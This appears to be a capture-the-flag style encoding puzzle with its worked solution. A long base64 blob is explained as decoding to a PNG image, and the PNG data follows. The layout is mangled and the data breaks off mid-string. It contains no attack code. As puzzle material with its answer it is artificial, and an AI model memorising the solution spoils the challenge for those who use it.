W81NmhtZFFwNFNld2UvZHVnZStSbS9LSmhTR1dhZ2kzaytQdjBxV0xnSXVwNU5QcUUxaVp5TklMWjBGOUxxY2xna3pURUpqMGdVaEZweSswOEZHN1FZc0pKeE00cEE4ZU1pU1pXc2E4NzBXRU9GYW5VYzJpb1diZU41RUtXb09TRWwwQzllclZFenhRWTNhYUpucWRyTDZhKy9idEMrMkVnMjVyK0dxSTJWaW9zMTU4TVpRbmdoOUx1cVozdFg1OXExQ2F4VzJCMzR1cEZGQ0hmYjhGK1ptQ0lramVpbW9GVHNzOXVpVnBrbGR2cXVhMmNyT2trdFB6Y3JNOUZQQzIyV1pQWnl4dnYvT09zU0dHWXVDVTZCUEFUV3AzVGVSN3JmNCt3VDhiZVJxZGp0ejFnbUxRYlEzZkRERXNiWjkzM25sR3h3QUhIdm1td2lZb1ZtMTZoK25rM0xEOWM4Y2RkempacEtOdGJkcTgyZEgyNGpXR096bFR5YStwRkNpL0VjQ3EzRTEvKzF1c3lMcVRURkFMdExaV01VZ20rTTZNY2RFeFBWbi9RWHYvQTgzWjVOWDJrRTFLaWhMRmk4ZnlVaDA0Y0NCb3lEZ2VGd2dnQjlsTldrYXV2dWIrUXhXVU1FVXloOEhXOE0xWnY2dHV4WmpLZkkzb1FjNHBTalFJYkE2YUlhWkpEeWtpdUtqMnVQbG14OU5Wb0pSVWIwMEFhU0tQcUlPK2JjMVFrM2JEcXZPWmk4WFdjek5CbEtyTmFnZXl0RlA4STdCOSsvYllkUkhYeG5nUFJLYmIzSkNhektTU3JvU2lKaVVTKzRaRndtQnIrTElpQmwrUlM3VzBqSW5BZHdIRmZpblJJWUFmZkxjRjV3MENPMHkyd3R3ZVN4amFSOVoybEpweW83aDMzejU5WXY1c3lUaXNXTG5TdFpRbXlmb082dnRlYnRIaU80TnQ2VEpseWhqaHdQYWt6U3FhVWFOVU1pYnc4T0RCZ2tjeXlmc2ZmMUs0ck9DWW5hUHBZNUFJRm4rbmtvWUUyNVVQRFJvVSt5eHFqd1pad21KcitHS0lkZTdVeVNoOEhRZDR5Wklsc25YcjFpQWZhNDdOa2dBQ0w3d1FSUDJZR0dKQmNOYjNna2U4UGhBZE5VNVRYSXpWaHh0YllCZlhyU3VOR2pXSzEvWHZYc000Qmh0Y1ZINzNvUXo0eDB0REREaXg1V1JxaUoybUJkc3B3U2VBN3pYS0VlR0JHNjNza25JNGZxMWF0cFJXV2xXaGNPSENWaE5CcWFUN0J3NFUvSll2V3JUSTZyTmVLb2ZGMXZCOGE3S0lIdnhtelpvWkg0c0ptdldaRWkwQzM5T3ZKQkFIOUtPUFBwSk82aytJTWxOdUdHR29jemRnd0FDanVTSXl5eWJsaUZHakVWRHkyaEQ3dHhwaXBuSWlmU3ROVVFWU0QxdVhvNTk2S3BZcmJNalFvZFl1QVZocEc2STNUNmFaRDd5R0VDWmJ3M05ERERVbFRRdk1Jb25odW5YcnZENSs3TTlsQXQ5Yk9OSzdQSlNNYXg3K1Y2Z3QyS0ZEQjdsT3Y0c3d4dHlTSGoxNkdLWFV5TDRndURXT01MZUxKTlpleWg2TEZDb0YxSUdiRW40Q1dJM0dqZEMxYmR2S09zMG5aeU80bG1ObERFWlowQ1JNdG9hblc1TW9PSXhsVUZQaGFwZ3BxWERwT2UxQUdxN1plei9hL1pvQ1ljT0dEYkxvelRkbDN0eTVzdCtERmNrcVZhcklkZTNhR1UzMk1hMDV5blBpajZ6Z09JK0xwSmZ5NDhHRHh0MXhSY3dZVlNnVXNTM2RSWVBvaG10eCtRWWFIV2txOERYRDU4WUhxQnhaMkd3TlR3MnhObTNhU0FIRDVleU5tbXZxSGMxclE0a2VnU05IamtSdlVqN1BDQmR0R0Z4NFlCVUZLMTE0ckZjbmZLKzN0M0IzZk4rOTl4cmRKV1BWRzFIUmxEOFNzREdLL3ZqcDFGNnhpVmcxL1MxUGJTVDhsQjhFNEtMUXQxOC9HVGxpaEhGNktZenpSazNVL0lLV3lmSWpiMlk4VG1Hek5Ud3p4T0EwM2Y2NjYrSXhpL3ZhNU1tVDQ3N09GMGtnaWdSdTE3eHYyeTJqU1E5cVZDZ01MNlNkUUdCQ1VLU0RibmxXcWxRcDZYRHdvMjhTOVpXMG9ZZ3EyQmhGVGlHdzZSTzVwU2pSSTRDYk92d2VQYStWYkVxVkttVTBRVnpmcjlaY2djakE3N2VFMGRid3pCQzc2cXFyQlBtRVRHVGJ0bTBNWXpjQlJaM0lFRUMxQWVRRkNydVVLRkVpbHZqUlpCNG9XWWFDMXBUNEJBNnFQNS9YOG91RlFaL3FpcGlOc2VmMS9ObmZid1J3akI1NTlGRjVYTjBHVEtWMTY5YUJNTVRDYUd0NDRxeVA0c01JSXpVVlpORjNJNHJMdEgvcWtRQUpwRWJnWm5YUVI3UmtNa0VHLzFHalJ5ZFR5K2oza2RmTGE3Rnh3RC91dU9OU0dwNUpTcG1VR3ZicFE0ZDlPRTVlVEhYeDRzV3grcU9tZlpVc1dWSnExYXhwcXU2S1hsaHREVTlXeEs2NDRnckJRVElSK0xjZ3FvdENBaVFRUGdJbm4zeXkwYUFSTm84dEVMY3V5c2NmZjd6Uk9MS1ZqdE90RmRPeElGR3dGMkk3QnlmR2RORENXVC9WbFMydkF4Q2M0SktvamFqTkorZGNuOVc2cnlpWWJTcm4xcWdocTlUdjB5OEpxNjNoaVNGbVUySUFZYlJlL2RENWRiS3dYeExJZEFMMzNIMjM0QkVVdWVINjZ3VVBFMEd0dmRkZWY5MUVOUzBkazVYRnREcUk4MkdiUGxPdE0zblk0MGpRT05OMDlLV296U2NubkhkWHJJamxGek05TDZwcnhuNC9KYXkyaHV0Ymt4ZGVlR0dzbElMSndVR1czdW5xTjBJaEFSSWdnYUFTd09xWkYySjY4WE55TERaOXBtcUkvUkkxUTB5RFRxSXFDQUphdG55NThmUlFPc2t2Q2JPdDRib2gxcTFyVitQak1tdldyRmdVbVBFSHFFZ0NKRUFDRVNXQXJWS1VrdkZTVHJEWTBrMjFWSm10LzYvWERHejdPeFJoUXd6bkhuSVFta3BXVnBhWXVpZVl0bW1xRjJaYncxVkRETlp4clZxMWpEakNYMlRLMUtsR3VsUWlBUklnZ1V3Z2dFTE5YZ29TWVpyS2dSUnJ4dUszM2tieWFMQ1hsd0tIYnh1eG5ZOU4yMEhRdGFtMmdQSENHUE5hd201cjJKMXhsblNSYmRkVTVzMmZMenQzN2pSVnB4NEprQUFKUko1QTZkS2xQWjFqS1l2K0RtZ091MVRFZGt2ekdJOVhCVzFYeEZKZEdVeUZuUitmMlcxWlppdkx3cGgzYWo1aHR6VmNNOFRLbFNzbkRlclhOK0tNTUcwbWNEVkNSU1VTSUlFTUluREdHV2Q0T3RzemJBeXhGRXRsSVFteGplVFRlb1plaW0zZFJOdjVlRGtYSi9xeTNVck84bmdWTndxMmhtdUdXT2ZPblkzOUd4WXZXU0pidDI1MTRweGhHeVJBQWlRUUdRSTJocEVUazdaWmdmczB4ZDlzT0lEYmJPY2Q1N0VoWnBzZkxkV1ZRU2VPbHhkdDJQcDgyUnF5NmM0aENyYUdLNFpZMGFKRnBVbmp4c1o4SjA2Y2FLeExSUklnQVJMSUZBSmVyb2dWTGx4WTh1ZlBiNHdXMVNCU0ZadFZwRDlaQkJDa09wNmNuenZlTWlwMmY0b3Jnem43RFBMZnB4UXFaRFc4SDMvNHdVby9IZVdvMkJxdUdHSWRPblNRWXczdllsYXRXaVhyMXExTDUxandzeVJBQWlRUVNRSlZxMWIxYkY1VnFsUXg3Z3ZKWE5NcEp2L3R0OThhOTFYQXdqZzBialNCb2sxMUFUU3piOSsrQksyRi82M1RpeGUzbXNUM0hocGlVYkUxSEUvb2lvaUpsaTFhR0IrNGlaTW1HZXRTa1FSSUlOZ0VacytlTFJzM2J2UjlrTmhPYVdIeE80UXhMMTI2MUdqY2E5ZXVOZEp6UXFsWXNXSnk1cGxuZWxLVHMrNUZGeGtQZWZQbXpYTGt5QkZqL2R5S1gydUIrL0xseStkK09lNy9YdnNjMlViOVlTNVJsam9XbWZYQndhdmdoU2paR280Yll0ZGVlNjN4OGpaKy9ONTU1NTBvbjhPY0d3bGtGQUZrblBjaTYzd3lxS2VkZHBxVkliWnc0VUlaTzI1Y3NtWjllZi9paXkvMnhCQzd5TUlRUzJkYkVoQnRqSmNpUllwNHl0Mm1QL2k2N2RxMXk5UHhlZGxaaVJJbHhHWjdIUDUvWDMzMWxTZERqSkt0NGVqV0pHcWpYZGV1bmZGQm1Qek1NOGE2VkNRQkVpQ0JUQ1J3Y2QyNnJrOGJUdnFtOVlBeG1IUlhQVzB1MW4vV0ZVRXZwVUtGQ3NiZDdkaXhJNjJWUWVPT2ZGSnMwS0NCVmM5YnRtd1JMMnB2UnMzV2NOUVF1L3JxcTZXUW9XUGZ0bTNiWk1HQ0JWWUhtY29rUUFJa2tHa0V6am5uSExHSlpreUZUOU1tVFl3L2hpMUptN0kzOFJxMjhTODc4Y1FUclZabDR2Vm44OXBaRnI1eW4zL3hoVTNUb2RKRnVTdWIybzJZM0FhUDNCS2labXM0Wm9naFpMVlR4NDdHSjlxVUtWTUUrY01vSkVBQ0pFQUNSeWVBVE8vWGQrOStkSVUwM3lsUW9JQzBzOWpKZU8rOTk2eTJGdU1OYjYxbGdGYkRoZzNqTmVQNGExaElxRjI3dG5HNzZ5M25ZZHh3QUJTN2FubENSTkxhaUUwNUpKdDJjK3BHMGRad3pCQnJwRitVNG9iUkZidDM3NWJaTDcyVWt5My9KZ0VTSUFFU09BcUJKcnBpQlg4ZE42Uk5telpXWldubXpwdVg5akMrK2VZYksxK2kxcTFhQ1F4R3Q2VkQrL2JHRWY4WWk2MUI2ZmI0bldxL2N1WEtWZ3NyNkJjTEswczk4UG1Pb3EzaG1DRUc2OWxVcGsrZkxqLzk5Sk9wT3ZWSWdBUklJS01KNU11WFQyNjc5VmJIR1NDNnRLT21HeklWL0c2LzhjWWJwdW9KOVZhc1hKbncvWnh2SXZoaTRNQ0JPVjl5L0crc2hObVV5b0ZqK2djZmZKRDJPTWFNR1NPalI0MFMyK2pFdERzK1NnTmx5NWFWVVNOSEN2eXdiR1Q1OHVYeWxRY1JwRkcwTlJ3eHhPQk1paEJyRTBGbzYvUVpNMHhVcVVNQ0pFQUNKUEFmQXRpZXM5bENUQVlPVzU1REJnK1dVMDQ1SlpucWY5OUhGUlRiV3BILy9YQ3VQMlpZWGdldXVQeHlhYXRSK1c0SUREMndzTWtLUC8rVlY4UW1NZTNSeG8zYWpIWHExSkhSbzBmTERGMmtnTCtlelRpTzFtNHFyeU9seUZNNkRsTmY3NXg5L04rc1dUbi9kZVh2cU5vYWpoaGkzYnAxTTRZK1N3K1dFeWV2Y1lkVUpBRVNJSUdJRU9qZHE1ZlVxbG5Ua2RuY2Z0dHRjdjc1NTF1MTljSUxMMWpwSjFLR1A5R2FOV3NTcWZ6aHZkNjllMHRqaTZvdGYyZ2d6Z3ZGVHo5ZC92bkVFMVlHS1pwNTl0bG40N1NXM2tzVksxYVVRWU1HeWJ5NWN3WFhWWnRJMW5SNmh1SFhYZjBRcDArYkpzaFdieXZZYWw2aVJycmJFbFZiSTIxRERCRTk1NTU3cmhGLzVGeUJrejZGQkVpQUJFakFuZ0MyS0I5NzdERzVYRmVIVWhXMDBmT09Pd1ExK214azBadHZ5a3FMN1VTVHRxZGFHak9vMlBMd1F3L0o0SWNmbHBOMEpTbGRhZGFzbWN5Y09WUGdFMlVqSzFhc2tJOC8vdGptSTFhNlNPU0xyZWk1YytZSVhIa1FyR0dUejh1ME01d0xXR21jcXRmbFcyKzV4Y28vTG1jZmp6Myt1T3RwSzZKc2E2U2QwTFdiaFcvWXZQbnpaV2VFazkvbFBESDVOd21RQUFtNFFRQUd5TENoUTJXbXJrNE5IejdjeXQ4V3F6OURoZ3dSMjlKSkJ3OGVsT0hEaGprK25UZlZ1RU5PTWROQXIrd0JOR3JVS0xZQU1HWHFWSGxka3dnam41ZXB3SmhEOGxwVWdFR3kzRlFFL1hvbGxYU1ZESTliMUZEYThza25zbWIxYXZsSVZ4T3hvcGhLM2k3NGZsV3FWRW5xMTY4dlY2a2hhck0xSFcvT1NNbyt6NEVBam5odDUzd3R5clpHV29ZWTlwTk5UMlJFVkV4aU9hT2M1eFgvSmdFU0lJR1VDU0NTRUtzWjhGVjYrZVdYWXhmbWVJM0JGK3lpQ3krVTVzMmJ5eVdYWEpMU3FzZUVpUk5kY2NUR2RXSEVpQkh5a0s1eTJRcTIwTzdVclVwczE2THMxTUpGaStUenp6OFhiSk1oTWgvMUxKRUw2OVJUVDVWVE5RM0RxZW9IaHEzWStzb0F1Y2xTbFpWYUgvbXR0OTVLOWVOcGZlNU12ZWJpa1MzWVpZSXh0blhyVnRtM2YzK3M3aVZxWCs3WHg4LzZIdXAwWXE1NG9HSUE2b25DR2Q4cEg3UWZ0SzdrUHg1OE1IczRyajFIM2RaSXl4RHIycVdMNU1tVHh3ZytuRHcvKyt3ekkxMHFrUUFKa0FBSkpDZFFzR0JCYWRlMmJleUJVanZidDIrUHJRNGQwS0NvVXpRblZoRTFWckRhQklmd1ZBWEp0OTI4aVlZaENkOG8yNjNTN1BuZ0dsUzlldlhZSS9zMXQ1Ni8wQVN1ZDk1NXAxdk5XN2VMMVQxc3E5cHVyVnAzRk9jRGh3OGZsb0gzM3g4NzUrSzg3ZWhMVWJjMVVqYkVUdGNsYml3UG04cUVDUk5NVmFsSEFpUkFBaGxQQUFaUUhsM05LbUdZbnhHUmYzallianNtQW8wVmozNzkrd3RTTmJncGo2dXpmTmx5NWFSZWlsdUZibzR0dTIwRW1kMTIrKzJ5ZCsvZTdKY3k5aGtybWZmZGQxOXNXOWh0Q0psZ2E2VHNySS9jTTNEME01RlZ1cFM3ZnYxNkUxWHFrQUFKa0FBSktBR2tpYmo3cnJzRUt3OStDSXl2MjlXcC84TVBQM1M5ZTVSTkdqQmdRTXdIeXZYT1V1Z0F4NkJ2djM2eExjQVVQaDZwaitCWS9mMkJCd1ErMzE1SUp0Z2FLUmxpU0FKNHpUWFhHQjhEK0JkUVNJQUVTSUFFN0FpOHJ3bER4NDRkYS9jaEI3UmhlUFJUdzhQcEtNbEVRME9PeVI0OWVsaW50RWpVcGhQdndmZXFUNTgrc216Wk1pZWFDM1ViZS9ic2taN3FrL2VTUjVWeE1zWFdTTWtRZzA4Q25DQk5aS01XQVYyNmRLbUpLblZJZ0FSSWdBUnlFUmlqaHRnY1RXUGdsV1Q3L3J5NWVMRlhYZjYzbjUwN2QwcjM2NitYVVpwVTFLK1Z3UDhPUnY5WTgvNzdnaEpRU04yUjZZS0tDaTAxUUdTeGgrZEZwdGdhMW9ZWURMQzJhb2laeXFUSmswMVZxVWNDSkVBQ0pKQ0xBUHh4N2xWL25FRWFXWWdvT1RkbDgrYk4wcUZqUjVtckNVWDlFc3dYWlgrUVlCU3BMZnlRbkdOQUFJU2Jza3hMQTMzMzNYZHVkcEZXMi9DSjY2L2J4bmZxcWlBaVViMlNUTEkxekp5OGNwQnZvVnVTaU5ReEVVU1l2UGJhYXlhcTFDRUJFaUFCRWtoQUFJbEhzY09BZkY2cFpEOVAwSFRNd0JzM2ZyeU0xOGVoUTRjU3FYcjJIclpsVzdSc0tWZGRkWldnR0hmcDBxVmQ3eHQrY1hQVUNFWGljYStpL0ovUVFJVW5uM3hTa0xBVXFUV1FZc1NONUsyMjhKQVc0M2s5NTJDVUkyakRhOGtrVzhQS0VJTnpma2U5V3pJVkpMM0RuVVdVNU1jZmZ6U2V6a0VMWGVOR0RSUnR4b2ptYlBYakRjRzBEU1NHaExPbkY0SXhtV1RmTmgyN3paaHQyc1NGeisyb05KdXhSMEVYSzBmZ2FocFFaSE84L09TemJ0MDZhYVAxRnBGRERINjZKVXFVU0dzNHVNQmlDM0tpK3ZIaXdoczB3ZS9GODg4L0g4dCszNkJCQStuY3FaTXJhU3F3NmpORCswRVdlL2hCZVMyNFRxN1dSSzE0UEtxVkU4cVVLU01vUWw2dGFsV3BWcTJhWjRZWnZqZllnb1FCWmx0K3lrbG1tV1pyNUtsVXVienhWUkhsSVA2aDBSSW1nb1I2VFpvMnRjcjZiTkl1ZFVpQUJFZ2d6QVFXNm9XdXNDWVlUU1pZL1dyYnJsMUN0UXN1dUVCYWFJYjRCdlhyR3lkcS9lbW5uMklKU1Y```markdown---title: \"Finding the Answer\"---**Title Explanation:** Find the answer from this pile of gibberish.**Answer:**---title: \"Translation Example\"---Actually, this question is quite straightforward and doesn't require much thought; those who frequently use encoding should recognize that this pile of garbled text is just a base64 string. Let's first [decode it back](https://www.base64encode.org/){:target=\"_blank\"} to get:```plaintextdata:image/png;base64,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